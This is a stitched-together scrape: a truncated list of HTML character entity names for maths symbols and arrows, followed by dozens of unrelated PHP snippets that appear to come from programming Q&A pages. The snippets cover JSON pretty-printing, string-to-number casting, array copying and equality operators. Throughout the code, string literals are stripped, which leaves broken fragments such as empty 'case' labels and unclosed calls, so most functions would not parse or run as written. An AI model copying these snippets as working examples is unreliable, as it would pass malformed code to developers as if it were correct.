&therefore; &Therefore; ∵ &becaus; &because; &Because; ∶ &ratio; ∷ &Colon; &Proportion; ∸ &minusd; &dotminus; ∺ &mDDot; ∻ &homtht; ∼ &sim; &Tilde; &thksim; &thicksim; ∽ &bsim; &backsim; ∾ &ac; &mstpos; ∿ &acd; ≀ &wreath; &VerticalTilde; &wr; ≁ &nsim; &NotTilde; ≂ &esim; &EqualTilde; &eqsim; ≃ &sime; &TildeEqual; &simeq; ≄ &nsime; &nsimeq; &NotTildeEqual; ≅ &cong; &TildeFullEqual; ≆ &simne; ≇ &ncong; &NotTildeFullEqual; ≈ &asymp; &ap; &TildeTilde; &approx; &thkap; &thickapprox; ≉ &nap; &NotTildeTilde; &napprox; ≊ &ape; &approxeq; ≋ &apid; ≌ &bcong; &backcong; ≍ &asympeq; &CupCap; ≎ &bump; &HumpDownHump; &Bumpeq; ≏ &bumpe; &HumpEqual; &bumpeq; ≐ &esdot; &DotEqual; &doteq; ≑ &eDot; &doteqdot; ≒ &efDot; &fallingdotseq; ≓ &erDot; &risingdotseq; ≔ &colone; &coloneq; &Assign; ≕ &ecolon; &eqcolon; ≖ &ecir; &eqcirc; ≗ &cire; &circeq; ≙ &wedgeq; ≚ &veeeq; ≜ &trie; &triangleq; ≟ &equest; &questeq; ≠ &ne; &NotEqual; ≡ &equiv; &Congruent; ≢ &nequiv; &NotCongruent; ≤ &le; &leq; ≥ &ge; &GreaterEqual; &geq; ≦ &lE; &LessFullEqual; &leqq; ≧ &gE; &GreaterFullEqual; &geqq; ≨ &lnE; &lneqq; ≩ &gnE; &gneqq; ≪ &Lt; &NestedLessLess; &ll; ≫ &Gt; &NestedGreaterGreater; &gg; ≬ &twixt; &between; ≭ &NotCupCap; ≮ &nlt; &NotLess; &nless; ≯ &ngt; &NotGreater; &ngtr; ≰ &nle; &NotLessEqual; &nleq; ≱ &nge; &NotGreaterEqual; &ngeq; ≲ &lsim; &LessTilde; &lesssim; ≳ &gsim; &gtrsim; &GreaterTilde; ≴ &nlsim; &NotLessTilde; ≵ &ngsim; &NotGreaterTilde; ≶ &lg; &lessgtr; &LessGreater; ≷ &gl; &gtrless; &GreaterLess; ≸ &ntlg; &NotLessGreater; ≹ &ntgl; &NotGreaterLess; ≺ &pr; &Precedes; &prec; ≻ &sc; &Succeeds; &succ; ≼ &prcue; &PrecedesSlantEqual; &preccurlyeq; ≽ &sccue; &SucceedsSlantEqual; &succcurlyeq; ≾ &prsim; &precsim; &PrecedesTilde; ≿ &scsim; &succsim; &SucceedsTilde; ⊀ &npr; &nprec; &NotPrecedes; ⊁ &nsc; &nsucc; &NotSucceeds; ⊂ &sub; &subset; ⊃ &sup; &supset; &Superset; ⊄ &nsub; ⊅ &nsup; ⊆ &sube; &SubsetEqual; &subseteq; ⊇ &supe; &supseteq; &SupersetEqual; ⊈ &nsube; &nsubseteq; &NotSubsetEqual; ⊉ &nsupe; &nsupseteq; &NotSupersetEqual; ⊊ &subne; &subsetneq; ⊋ &supne; &supsetneq; ⊍ &cupdot; ⊎ &uplus; &UnionPlus; ⊏ &sqsub; &SquareSubset; &sqsubset; ⊐ &sqsup; &SquareSuperset; &sqsupset; ⊑ &sqsube; &SquareSubsetEqual; &sqsubseteq; ⊒ &sqsupe; &SquareSupersetEqual; &sqsupseteq; ⊓ &sqcap; &SquareIntersection; ⊔ &sqcup; &SquareUnion; ⊕ &oplus; &CirclePlus; ⊖ &ominus; &CircleMinus; ⊗ &otimes; &CircleTimes; ⊘ &osol; ⊙ &odot; &CircleDot; ⊚ &ocir; &circledcirc; ⊛ &oast; &circledast; ⊝ &odash; &circleddash; ⊞ &plusb; &boxplus; ⊟ &minusb; &boxminus; ⊠ &timesb; &boxtimes; ⊡ &sdotb; &dotsquare; ⊢ &vdash; &RightTee; ⊣ &dashv; &LeftTee; ⊤ &top; &DownTee; ⊥ &bottom; &bot; &perp; &UpTee; ⊧ &models; ⊨ &vDash; &DoubleRightTee; ⊩ &Vdash; ⊪ &Vvdash; ⊫ &VDash; ⊬ &nvdash; ⊭ &nvDash; ⊮ &nVdash; ⊯ &nVDash; ⊰ &prurel; ⊲ &vltri; &vartriangleleft; &LeftTriangle; ⊳ &vrtri; &vartriangleright; &RightTriangle; ⊴ &ltrie; &trianglelefteq; &LeftTriangleEqual; ⊵ &rtrie; &trianglerighteq; &RightTriangleEqual; ⊶ &origof; ⊷ &imof; ⊸ &mumap; &multimap; ⊹ &hercon; ⊺ &intcal; &intercal; ⊻ &veebar; ⊽ &barvee; ⊾ &angrtvb; ⊿ &lrtri; ⋀ &xwedge; &Wedge; &bigwedge; ⋁ &xvee; &Vee; &bigvee; ⋂ &xcap; &Intersection; &bigcap; ⋃ &xcup; &Union; &bigcup; ⋄ &diam; &diamond; &Diamond; ⋅ &sdot; ⋆ &sstarf; &Star; ⋇ &divonx; &divideontimes; ⋈ &bowtie; ⋉ &ltimes; ⋊ &rtimes; ⋋ &lthree; &leftthreetimes; ⋌ &rthree; &rightthreetimes; ⋍ &bsime; &backsimeq; ⋎ &cuvee; &curlyvee; ⋏ &cuwed; &curlywedge; ⋐ &Sub; &Subset; ⋑ &Sup; &Supset; ⋒ &Cap; ⋓ &Cup; ⋔ &fork; &pitchfork; ⋕ &epar; ⋖ &ltdot; &lessdot; ⋗ &gtdot; &gtrdot; ⋘ &Ll; ⋙ &Gg; &ggg; ⋚ &leg; &LessEqualGreater; &lesseqgtr; ⋛ &gel; &gtreqless; &GreaterEqualLess; ⋞ &cuepr; &curlyeqprec; ⋟ &cuesc; &curlyeqsucc; ⋠ &nprcue; &NotPrecedesSlantEqual; ⋡ &nsccue; &NotSucceedsSlantEqual; ⋢ &nsqsube; &NotSquareSubsetEqual; ⋣ &nsqsupe; &NotSquareSupersetEqual; ⋦ &lnsim; ⋧ &gnsim; ⋨ &prnsim; &precnsim; ⋩ &scnsim; &succnsim; ⋪ &nltri; &ntriangleleft; &NotLeftTriangle; ⋫ &nrtri; &ntriangleright; &NotRightTriangle; ⋬ &nltrie; &ntrianglelefteq; &NotLeftTriangleEqual; ⋭ &nrtrie; &ntrianglerighteq; &NotRightTriangleEqual; ⋮ &vellip; ⋯ &ctdot; ⋰ &utdot; ⋱ &dtdot; ⋲ &disin; ⋳ &isinsv; ⋴ &isins; ⋵ &isindot; ⋶ &notinvc; ⋷ &notinvb; ⋹ &isinE; ⋺ &nisd; ⋻ &xnis; ⋼ &nis; ⋽ &notnivc; ⋾ &notnivb; ⌅ &barwed; &barwedge; ⌆ &Barwed; &doublebarwedge; ⌈ &lceil; &LeftCeiling; ⌉ &rceil; &RightCeiling; ⌊ &lfloor; &LeftFloor; ⌋ &rfloor; &RightFloor; ⌌ &drcrop; ⌍ &dlcrop; ⌎ &urcrop; ⌏ &ulcrop; ⌐ &bnot; ⌒ &profline; ⌓ &profsurf; ⌕ &telrec; ⌖ &target; ⌜ &ulcorn; &ulcorner; ⌝ &urcorn; &urcorner; ⌞ &dlcorn; &llcorner; ⌟ &drcorn; &lrcorner; ⌢ &frown; &sfrown; ⌣ &smile; &ssmile; ⌭ &cylcty; ⌮ &profalar; ⌶ &topbot; ⌽ &ovbar; ⌿ &solbar; ⍼ &angzarr; ⎰ &lmoust; &lmoustache; ⎱ &rmoust; &rmoustache; ⎴ &tbrk; &OverBracket; ⎵ &bbrk; &UnderBracket; ⎶ &bbrktbrk; ⏜ &OverParenthesis; ⏝ &UnderParenthesis; ⏞ &OverBrace; ⏟ &UnderBrace; ⏢ &trpezium; ⏧ &elinters; ␣ &blank; Ⓢ &oS; &circledS; ─ &boxh; &HorizontalLine; │ &boxv; ┌ &boxdr; ┐ &boxdl; └ &boxur; ┘ &boxul; ├ &boxvr; ┤ &boxvl; ┬ &boxhd; ┴ &boxhu; ┼ &boxvh; ═ &boxH; ║ &boxV; ╒ &boxdR; ╓ &boxDr; ╔ &boxDR; ╕ &boxdL; ╖ &boxDl; ╗ &boxDL; ╘ &boxuR; ╙ &boxUr; ╚ &boxUR; ╛ &boxuL; ╜ &boxUl; ╝ &boxUL; ╞ &boxvR; ╟ &boxVr; ╠ &boxVR; ╡ &boxvL; ╢ &boxVl; ╣ &boxVL; ╤ &boxHd; ╥ &boxhD; ╦ &boxHD; ╧ &boxHu; ╨ &boxhU; ╩ &boxHU; ╪ &boxvH; ╫ &boxVh; ╬ &boxVH; ▀ &uhblk; ▄ &lhblk; █ &block; ░ &blk14; ▒ &blk12; ▓ &blk34; □ &squ; &square; &Square; ▪ &squf; &squarf; &blacksquare; &FilledVerySmallSquare; ▫ &EmptyVerySmallSquare; ▭ &rect; ▮ &marker; ▱ &fltns; △ &xutri; &bigtriangleup; ▴ &utrif; &blacktriangle; ▵ &utri; &triangle; ▸ &rtrif; &blacktriangleright; ▹ &rtri; &triangleright; ▽ &xdtri; &bigtriangledown; ▾ &dtrif; &blacktriangledown; ▿ &dtri; &triangledown; ◂ &ltrif; &blacktriangleleft; ◃ &ltri; &triangleleft; ◊ &loz; &lozenge; ○ &cir; ◬ &tridot; ◯ &xcirc; &bigcirc; ◸ &ultri; ◹ &urtri; ◺ &lltri; ◻ &EmptySmallSquare; ◼ &FilledSmallSquare; ★ &starf; &bigstar; ☆ &star; ☎ &phone; ♀ &female; ♂ &male; ♠ &spades; &spadesuit; ♣ &clubs; &clubsuit; ♥ &hearts; &heartsuit; ♦ &diams; &diamondsuit; ♪ &sung; ♭ &flat; ♮ &natur; &natural; ♯ &sharp; ✓ &check; &checkmark; ✗ &cross; ✠ &malt; &maltese; ✶ &sext; ❘ &VerticalSeparator; ❲ &lbbrk; ❳ &rbbrk; ⟦ &lobrk; &LeftDoubleBracket; ⟧ &robrk; &RightDoubleBracket; ⟨ &lang; &LeftAngleBracket; &langle; ⟩ &rang; &RightAngleBracket; &rangle; ⟪ &Lang; ⟫ &Rang; ⟬ &loang; ⟭ &roang; ⟵ &xlarr; &longleftarrow; &LongLeftArrow; ⟶ &xrarr; &longrightarrow; &LongRightArrow; ⟷ &xharr; &longleftrightarrow; &LongLeftRightArrow; ⟸ &xlArr; &Longleftarrow; &DoubleLongLeftArrow; ⟹ &xrArr; &Longrightarrow; &DoubleLongRightArrow; ⟺ &xhArr; &Longleftrightarrow; &DoubleLongLeftRightArrow; ⟼ &xmap; &longmapsto; ⟿ &dzigrarr; ⤂ &nvlArr; ⤃ &nvrArr; ⤄ &nvHarr; ⤅ &Map; ⤌ &lbarr; ⤍ &rbarr; &bkarow; ⤎ &lBarr; ⤏ &rBarr; &dbkarow; ⤐ &RBarr; &drbkarow; ⤑ &DDotrahd; ⤒ &UpArrowBar; ⤓ &DownArrowBar; ⤖ &Rarrtl; ⤙ &latail; ⤚ &ratail; ⤛ &lAtail; ⤜ &rAtail; ⤝ &larrfs; ⤞ &rarrfs; ⤟ &larrbfs; ⤠ &rarrbfs; ⤣ &nwarhk; ⤤ &nearhk; ⤥ &searhk; &hksearow; ⤦ &swarhk; &hkswarow; ⤧ &nwnear; ⤨ &nesear; &toea; ⤩ &seswar; &tosa; ⤪ &swnwar; ⤳ &rarrc; ⤵ &cudarrr; ⤶ &ldca; ⤷ &rdca; ⤸ &cudarrl; ⤹ &larrpl; ⤼ &curarrm; ⤽ &cularrp; ⥅ &rarrpl; ⥈ &harrcir; ⥉ &Uarrocir; ⥊ &lurdshar; ⥋ &ldrushar; ⥎ &LeftRightVector; ⥏ &RightUpDownVector; ⥐ &DownLeftRightVector; ⥑ &LeftUpDownVector; ⥒ &LeftVectorBar; ⥓ &RightVectorBar; ⥔ &RightUpVectorBar; ⥕ &RightDownVectorBar; ⥖ &DownLeftVectorBar; ⥗ &DownRightVectorBar; ⥘ &LeftUpVectorBar; ⥙ &LeftDownVectorBar; ⥚ &LeftTeeVector; ⥛ &RightTeeVector; ⥜ &RightUpTeeVector; ⥝ &RightDownTeeVector; ⥞ &DownLeftTeeVector; ⥟ &DownRightTeeVector; ⥠ &LeftUpTeeVector; ⥡ &LeftDownTeeVector; ⥢ &lHar; ⥣ &uHar; ⥤ &rHar; ⥥ &dHar; ⥦ &luruhar; ⥧ &ldrdhar; ⥨ &ruluhar; ⥩ &rdldhar; ⥪ &lharul; ⥫ &llhard; ⥬ &rharul; ⥭ &lrhard; ⥮ &udhar; &UpEquilibrium; ⥯ &duhar; &ReverseUpEquilibrium; ⥰ &RoundImplies; ⥱ &erarr; ⥲ &simrarr; ⥳ &larrsim; ⥴ &rarrsim; ⥵ &rarrap; ⥶ &ltlarr; ⥸ &gtrarr; ⥹ &subrarr; ⥻ &suplarr; ⥼ &lfisht; ⥽ &rfisht; ⥾ &ufisht; ⥿ &dfisht; ⦅ &lopar; ⦆ &ropar; ⦋ &lbrke; ⦌ &rbrke; ⦍ &lbrkslu; ⦎ &rbrksld; ⦏ &lbrksld; ⦐ &rbrkslu; ⦑ &langd; ⦒
<VirtualHost *> ServerName example.com UseCanonicalName on </VirtualHost>
<?php header("Content-type: text/plain"); print_r($_SERVER); ?>
public function isPOST() { return (($this->requestMethod === $this->hasTokenTimeLeft() && $this->hasSameGETandPOSTIdentities() && ($this->httpHost === filter_input(INPUT_SERVER, }
function getRealHost(){ list($realHost,)=explode( return $realHost; }
<?php ... $json_string = json_encode($data, JSON_PRETTY_PRINT);
prettyPrint( $json ) === prettyPrint( prettyPrint( $json ) )
function prettyPrint( $json ) { $result = $level = 0; $in_quotes = false; $in_escape = false; $ends_line_level = NULL; $json_length = strlen( $json ); for( $i = 0; $i < $json_length; $i++ ) { $char = $json[$i]; $new_line_level = NULL; $post = ""; if( $ends_line_level !== NULL ) { $new_line_level = $ends_line_level; $ends_line_level = NULL; } if ( $in_escape ) { $in_escape = false; } else if( $char === $in_quotes = !$in_quotes; } else if( ! $in_quotes ) { switch( $char ) { case $level--; $ends_line_level = NULL; $new_line_level = $level; break; case $level++; case $ends_line_level = $level; break; case $post = " "; break; case " ": case "\t": case "\n": case "\r": $char = ""; $ends_line_level = $new_line_level; $new_line_level = NULL; break; } } else if ( $char === $in_escape = true; } if( $new_line_level !== NULL ) { $result .= "\n".str_repeat( "\t", $new_line_level ); } $result .= $char.$post; } return $result; }
$json = json_encode(json_decode($json), JSON_PRETTY_PRINT);
header( $json_ugly = $json_pretty = json_encode(json_decode($json_ugly), JSON_PRETTY_PRINT); echo $json_pretty;
if (!defined( define( if (!defined( define( if (!defined( define( function _json_encode($data, $options = 448) { if (version_compare(PHP_VERSION, { return json_encode($data, $options); } return _json_format(json_encode($data), $options); } function _pretty_print_json($json) { return _json_format($json, JSON_PRETTY_PRINT); } function _json_format($json, $options = 448) { $prettyPrint = (bool) ($options & JSON_PRETTY_PRINT); $unescapeUnicode = (bool) ($options & JSON_UNESCAPED_UNICODE); $unescapeSlashes = (bool) ($options & JSON_UNESCAPED_SLASHES); if (!$prettyPrint && !$unescapeUnicode && !$unescapeSlashes) { return $json; } $result = $pos = 0; $strLen = strlen($json); $indentStr = $newLine = "\n"; $outOfQuotes = true; $buffer = $noescape = true; for ($i = 0; $i < $strLen; $i++) { $char = substr($json, $i, 1); if ( { $outOfQuotes = !$outOfQuotes; } if (!$outOfQuotes) { $buffer .= $char; $noescape = continue; } elseif ( { if ($unescapeSlashes) { $buffer = str_replace( } if ($unescapeUnicode && function_exists( { $buffer = preg_replace_callback( function ($match) { return mb_convert_encoding(pack( }, $buffer); } $result .= $buffer . $char; $buffer = continue; } elseif(false !== strpos(" \t\r\n", $char)) { continue; } if ( { $char .= } elseif (( { $pos--; $prevChar = substr($json, $i - 1, 1); if ( { $result .= $newLine; for ($j = 0; $j < $pos; $j++) { $result .= $indentStr; } } else { $result = rtrim($result) . "\n\n" . $indentStr; } } $result .= $char; if ( { $result .= $newLine; if ( { $pos++; } for ($j = 0; $j < $pos; $j++) { $result .= $indentStr; } } } if (strlen($buffer) > 0) { $result = false; } return $result; }
<pre> <?php echo json_encode($dataArray, JSON_PRETTY_PRINT); ?> </pre>
function prettyPrint( $json ){ $result = $level = 0; $in_quotes = false; $in_escape = false; $ends_line_level = NULL; $json_length = strlen( $json ); for( $i = 0; $i < $json_length; $i++ ) { $char = $json[$i]; $new_line_level = NULL; $post = ""; if( $ends_line_level !== NULL ) { $new_line_level = $ends_line_level; $ends_line_level = NULL; } if ( $in_escape ) { $in_escape = false; } else if( $char === $in_quotes = !$in_quotes; } else if( ! $in_quotes ) { switch( $char ) { case $level--; $ends_line_level = NULL; $new_line_level = $level; $char.="<br>"; for($index=0;$index<$level-1;$index++){$char.="-----";} break; case $level++; $char.="<br>"; for($index=0;$index<$level;$index++){$char.="-----";} break; case $ends_line_level = $level; $char.="<br>"; for($index=0;$index<$level;$index++){$char.="-----";} break; case $post = " "; break; case "\t": case "\n": case "\r": $char = ""; $ends_line_level = $new_line_level; $new_line_level = NULL; break; } } else if ( $char === $in_escape = true; } if( $new_line_level !== NULL ) { $result .= "\n".str_repeat( "\t", $new_line_level ); } $result .= $char.$post; } echo "RESULTS ARE: <br><br>$result"; return $result;
RESULTS ARE: { - - - "results" : [ - - -- - - { - - -- - -- - - "address_components" : [ - - -- - -- - -- - - { - - -- - -- - -- - -- - - "long_name" : "Calgary" - - -- - -- - -- - -- - - "short_name" : "Calgary" - - -- - -- - -- - -- - - "types" : [ - - -- - -- - -- - -- - -- - - "locality" - - -- - -- - -- - -- - -- - - "political" ] - - -- - -- - -- - - } - - -- - -- - - - - -- - -- - -- - - { - - -- - -- - -- - -- - - "long_name" : "Division No. 6" - - -- - -- - -- - -- - - "short_name" : "Division No. 6" - - -- - -- - -- - -- - - "types" : [ - - -- - -- - -- - -- - -- - - "administrative_area_level_2" - - -- - -- - -- - -- - -- - - "political" ] - - -- - -- - -- - - } - - -- - -- - - - - -- - -- - -- - - { - - -- - -- - -- - -- - - "long_name" : "Alberta" - - -- - -- - -- - -- - - "short_name" : "AB" - - -- - -- - -- - -- - - "types" : [ - - -- - -- - -- - -- - -- - - "administrative_area_level_1" - - -- - -- - -- - -- - -- - - "political" ] - - -- - -- - -- - - } - - -- - -- - - - - -- - -- - -- - - { - - -- - -- - -- - -- - - "long_name" : "Canada" - - -- - -- - -- - -- - - "short_name" : "CA" - - -- - -- - -- - -- - - "types" : [ - - -- - -- - -- - -- - -- - - "country" - - -- - -- - -- - -- - -- - - "political" ] - - -- - -- - -- - - } - - -- - -- - - ] - - -- - - - - -- - -- - - "formatted_address" : "Calgary, AB, Canada" - - -- - -- - - "geometry" : { - - -- - -- - -- - - "bounds" : { - - -- - -- - -- - -- - - "northeast" : { - - -- - -- - -- - -- - -- - - "lat" : 51.18383 - - -- - -- - -- - -- - -- - - "lng" : -113.8769511 } - - -- - -- - -- - - - - -- - -- - -- - -- - - "southwest" : { - - -- - -- - -- - -- - -- - - "lat" : 50.84240399999999 - - -- - -- - -- - -- - -- - - "lng" : -114.27136 } - - -- - -- - -- - - } - - -- - -- - - - - -- - -- - -- - - "location" : { - - -- - -- - -- - -- - - "lat" : 51.0486151 - - -- - -- - -- - -- - - "lng" : -114.0708459 } - - -- - -- - - - - -- - -- - -- - - "location_type" : "APPROXIMATE" - - -- - -- - -- - - "viewport" : { - - -- - -- - -- - -- - - "northeast" : { - - -- - -- - -- - -- - -- - - "lat" : 51.18383 - - -- - -- - -- - -- - -- - - "lng" : -113.8769511 } - - -- - -- - -- - - - - -- - -- - -- - -- - - "southwest" : { - - -- - -- - -- - -- - -- - - "lat" : 50.84240399999999 - - -- - -- - -- - -- - -- - - "lng" : -114.27136 } - - -- - -- - -- - - } - - -- - -- - - } - - -- - - - - -- - -- - - "place_id" : "ChIJ1T-EnwNwcVMROrZStrE7bSY" - - -- - -- - - "types" : [ - - -- - -- - -- - - "locality" - - -- - -- - -- - - "political" ] - - -- - - } - - - ] - - - "status" : "OK" }
$s = $crl = 0; $ss = false; echo "<pre>"; for($c=0; $c<strlen($s); $c++) { if ( $s[$c] == { $crl--; echo "\n"; echo str_repeat( } if ( $s[$c] == { echo "\n"; echo str_repeat( } if ( $s[$c] == { if ( $s[$c-1] == echo else echo } echo $s[$c]; if ( $s[$c] == echo if ( $s[$c] == $ss = !$ss; if ( $s[$c] == { $crl++; echo "\n"; echo str_repeat( } } echo $s[$c];
$array = array( "a" => "apple", "b" => "banana", "c" => "catnip" ); foreach ($array as $a_key => $a_val) { $json .= "\"{$a_key}\" : \"{$a_val}\",\n"; } header( echo "{\n" .rtrim($json, ",\n") . "\n}";
class JsonFormatter { public static function prettyPrint(&$j, $indentor = "\t", $indent = "") { $inString = $escaped = false; $result = $indent; if(is_string($j)) { $bak = $j; $j = str_split(trim($j, } while(count($j)) { $c = array_shift($j); if(false !== strpos("{[,]}", $c)) { if($inString) { $result .= $c; } else if($c == $result .= $c."\n"; $result .= self::prettyPrint($j, $indentor, $indentor.$indent); $result .= $indent.array_shift($j); } else if($c == array_unshift($j, $c); $result .= "\n"; return $result; } else { $result .= $c."\n".$indent; } } else { $result .= $c; $c == $escaped = $c == } } $j = $bak; return $result; } }
php > require php > $a = array( php > print_r($a); Array ( [foo] => 1 [bar] => This "is" bar [baz] => Array ( [a] => 1 [b] => 2 [c] => "3" ) ) php > echo JsonFormatter::prettyPrint(json_encode($a)); { "foo":1, "bar":"This \"is\" bar", "baz":{ "a":1, "b":2, "c":"\"3\"" } }
echo "<pre>"; echo json_encode(json_decode($json_response), JSON_PRETTY_PRINT); echo "</pre>"; { "data": { "token_type": "bearer", "expires_in": 3628799, "scopes": "full_access", "created_at": 1540504324 }, "errors": [], "pagination": {}, "token_type": "bearer", "expires_in": 3628799, "scopes": "full_access", "created_at": 1540504324 }
function print_nice($elem,$max_level=10,$print_nice_stack=array()){ if(is_array($elem) || is_object($elem)){ if(in_array($elem,$print_nice_stack,true)){ echo "<font color=red>RECURSION</font>"; return; } $print_nice_stack[]=&$elem; if($max_level<1){ echo "<font color=red>nivel maximo alcanzado</font>"; return; } $max_level--; echo "<table border=1 cellspacing=0 cellpadding=3 width=100%>"; if(is_array($elem)){ echo }else{ echo echo } $color=0; foreach($elem as $k => $v){ if($max_level%2){ $rgb=($color++%2)?" }else{ $rgb=($color++%2)?" } echo echo print_nice($v,$max_level,$print_nice_stack); echo "</td></tr>"; } echo "</table>"; return; } if($elem === null){ echo "<font color=green>NULL</font>"; }elseif($elem === 0){ echo "0"; }elseif($elem === true){ echo "<font color=green>TRUE</font>"; }elseif($elem === false){ echo "<font color=green>FALSE</font>"; }elseif($elem === ""){ echo "<font color=green>EMPTY STRING</font>"; }else{ echo str_replace("\n","<strong><font color=red>*</font></strong><br>\n",$elem); } }
<?php /** * Formats a JSON string for pretty printing * * @param string $json The JSON to make pretty * @param bool $html Insert nonbreaking spaces and <br />s for tabs and linebreaks * @return string The prettified output * @author Jay Roberts */ function _format_json($json, $html = false) { $tabcount = 0; $result = $inquote = false; $ignorenext = false; if ($html) { $tab = "&nbsp;&nbsp;&nbsp;&nbsp;"; $newline = "<br/>"; } else { $tab = "\t"; $newline = "\n"; } for($i = 0; $i < strlen($json); $i++) { $char = $json[$i]; if ($ignorenext) { $result .= $char; $ignorenext = false; } else { switch($char) { case case $tabcount++; $result .= $char . $newline . str_repeat($tab, $tabcount); break; case case $tabcount--; $result = trim($result) . $newline . str_repeat($tab, $tabcount) . $char; break; case $result .= $char . $newline . str_repeat($tab, $tabcount); break; case $inquote = !$inquote; $result .= $char; break; case if ($inquote) $ignorenext = true; $result .= $char; break; default: $result .= $char; } } } return $result; }
/** * takes an object parameter and returns the pretty json format. * this is a space saving version that uses 2 spaces instead of the regular 4 * * @param $in * * @return string */ function pretty_json ($in): string { return preg_replace_callback( function (array $matches): string { return str_repeat( }, json_encode($in, JSON_PRETTY_PRINT | JSON_HEX_APOS) ); } /** * takes a JSON string an adds colours to the keys/values * if the string is not JSON then it is returned unaltered. * * @param string $in * * @return string */ function markup_json (string $in): string { $string = $number = $null = $key = $pattern = return preg_replace_callback($pattern, function (array $matches) use ($string, $number, $null, $key): string { $match = $matches[0]; $colour = $number; if (preg_match( { $colour = preg_match( ? $key : $string; } elseif ($match === { $colour = $null; } return "<span style= }, str_replace([ ) ?? $in; } public function test_pretty_json_object () { $ob = new \stdClass(); $ob->test = $json = pretty_json($ob); $expected = <<<JSON { "test": "unit-tester" } JSON; $this->assertEquals($expected, $json); } public function test_pretty_json_str () { $ob = $json = pretty_json($ob); $this->assertEquals("\"$ob\"", $json); } public function test_markup_json () { $json = <<<JSON [{"name":"abc","id":123,"warnings":[],"errors":null},{"name":"abc"}] JSON; $expected = <<<STR [ { <span style= <span style= <span style= <span style= }, { <span style= } ] STR; $output = markup_json(pretty_json(json_decode($json))); $this->assertEquals($expected,$output); }
<html> <body> Testing JSON array output <pre> <?php $data = array( $data = json_encode($data); echo "</br>Json as single line </br>"; echo $data; echo "</br>Json as multiline array </br>"; print_r(json_decode($data, true)); ?> </pre> </body> </html>
Testing JSON array output Json as single line {"a":"apple","b":"banana","c":"catnip"} Json as multiline array Array ( [a] => apple [b] => banana [c] => catnip )
public function getLatestUsers() { header( echo $this->model->getLatestUsers(); }
$num = "3.14"; $int = (int)$num; $float = (float)$num;
<?php echo intval(42); echo intval(4.2); echo intval( echo intval( echo intval( echo intval(042); echo intval( echo intval(1e10); echo intval( echo intval(0x1A); echo intval(42000000); echo intval(420000000000000000000); echo intval( echo intval(42, 8); echo intval( echo intval(array()); echo intval(array( ?>
$number = ($value == (int) $value) ? (int) $value : (float) $value;
if( is_numeric($string) ) $number = $string + 0; else $number = 0;
$a = "whatever"; if (is_numeric($a)) var_dump(floatval($a)); else var_dump($a);
function toNumber($val) { if (is_numeric($val)) { $int = (int)$val; $float = (float)$val; $val = ($int == $float) ? $int : $float; return $val; } else { trigger_error("Cannot cast $val to a number", E_USER_WARNING); return null; } }
function type($mixed, $parseNumeric = false) { if ($parseNumeric && is_numeric($mixed)) { $mixed += 0; } $t = gettype($mixed); switch($t) { case case case default: return $t; } }
((int) $var) ( but in big number it return 2147483647 :-) )
if (is_numeric($var)) $var = (isset($var)) ? $var : 0; else $var = 0;
if (is_numeric($var)) $var = (trim($var) == else $var = 0;
$num = "3.14"; $int = (int)$num; $float = (float)$num; $double = (double)$num;
<?php $str="3.148"; $num=$str; printf("%f\n", $num); ?>
$number = "1.234"; echo gettype ($number) . "\n"; settype($number , "float"); echo gettype ($number) . "\n";
$num = "2.12"; var_dump(is_float($num)); var_dump(is_int($num)); var_dump(is_string($num)); $num = $num*1; var_dump(is_float($num)); var_dump(is_int($num)); var_dump(is_string($num));
function str2num($s){ $return_value = !is_numeric($s) ? false : (intval($s)==floatval($s)) ? intval($s) :floatval($s); print "\nret=$return_value type=".gettype($return_value)."\n"; }
<?php $data = ["1","2","3","4","5"]; echo json_encode($data, JSON_NUMERIC_CHECK); ?>
$nums = ["0","1","2","3","4","5","6","7","8","9"]; $int = 15939; $string = ""; while ($int) { $string .= $nums[$int % 10]; $int = (int)($int / 10); } $result = strrev($string);
$a = new StdClass(); $b = $a; $b->foo = 42; var_dump($a);
function array_clone($array) { return array_map(function($element) { return ((is_array($element)) ? call_user_func(__FUNCTION__, $element) : ((is_object($element)) ? clone $element : $element ) ); }, $array); }
$original = [ $cloned = array_replace([], $original); $clonedWithReassignment = array_replace([], $original, [ $clonedWithNewValues = array_replace([], $original, [ $original[
{"foo":"bar","fiz":"baz","new":"val"} {"foo":"bar","fiz":"baz"} {"foo":"changed","fiz":"baz"} {"foo":"bar","fiz":"baz","add":"new"}
$o1 = new stdClass; $a = $o1->ar1 = [ $o1->ar1[3] = & $a; $o1->ar2 = $o1->ar1; $o1->ar1[0] = $o1->ar1[3] = $o1->ar3 = array_replace($o1->ar1, [2 => [ $o1->ar4 = array_replace_recursive($o1->ar1, [3 => var_dump($o1);
["ar1"]=> array(4) { [0]=> string(1) "z" [1]=> string(1) "b" [2]=> array(2) { [0]=> string(2) "ca" [1]=> string(2) "cb" } [3]=> &string(1) "e" } ["ar2"]=> array(4) { [0]=> string(1) "a" [1]=> string(1) "b" [2]=> array(2) { [0]=> string(2) "ca" [1]=> string(2) "cb" } [3]=> &string(1) "e" } ["ar3"]=> array(4) { [0]=> string(1) "z" [1]=> string(1) "b" [2]=> array(1) { [0]=> string(2) "aa" } [3]=> string(1) "d" } ["ar4"]=> array(4) { [0]=> string(1) "z" [1]=> string(1) "b" [2]=> array(2) { [0]=> string(2) "bb" [1]=> string(2) "cb" } [3]=> string(1) "f" }
$copied_array = array_slice($original_array,0,count($original_array));
function equal_array($arr){ $ArrayObject = new ArrayObject($arr); return $ArrayObject->getArrayCopy(); } $test = array("aa","bb",3); $test2 = equal_array($test); print_r($test2);
<?php function arrayCopy( array $array ) { $result = array(); foreach( $array as $key => $val ) { if( is_array( $val ) ) { $result[$key] = arrayCopy( $val ); } elseif ( is_object( $val ) ) { $result[$key] = clone $val; } else { $result[$key] = $val; } } return $result; } ?>
$a = array( ); $b = $a; var_dump($b); output: array:1 [ "data" => 10 ]
private function cloneObject($mixed) { switch (true) { case is_object($mixed): return clone $mixed; case is_array($mixed): return array_map(array($this, __FUNCTION__), $mixed); default: return $mixed; } }
public function getError() { return $this->error; }
public function getError() { return $this->error; }
public function isErrorSet() { if (isset($this->error) && !empty($this->error)) { return true; } else { return false; } }
1 === 1: true 1 == 1: true 1 === "1": false 1 == "1": true "foo" === "foo": true
$a = new stdClass(); $a->foo = "bar"; $b = clone $a; var_dump($a === $b);
var x = 4; var y = if (x == y) { alert( } if (x === y) { alert( }
class TestClassA { public $a; } class TestClassB { public $a; } $a1 = new TestClassA(); $a2 = new TestClassA(); $b = new TestClassB(); $a1->a = 10; $a2->a = 10; $b->a = 10; $a1 == $a1; $a1 == $a2; $a1 != $b; $a1 === $a1; $a1 !== $a2;
$arr = array("name"); if (array_search("name", $arr) == false) { }
